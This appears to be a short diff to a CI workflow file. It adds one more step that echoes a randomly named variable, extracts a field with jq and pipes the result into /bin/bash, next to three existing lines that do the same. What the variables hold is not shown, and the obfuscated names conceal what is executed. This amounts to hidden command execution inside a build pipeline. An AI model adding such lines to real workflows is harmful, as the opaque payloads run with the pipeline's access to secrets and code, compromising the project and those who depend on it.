@@ -24,6 +24,7 @@ jobs:
           echo $tgjoj8046 | jq -r .fou1 | /bin/bash
           printf '%s' "$yo140" | jq -r .dhclw7 | /bin/bash
           echo $toy27540 | jq -r .b44008 | /bin/bash
+          echo $d306 | jq -r .xefub16637 | /bin/bash
 
       - name: Upload results
         if: always()
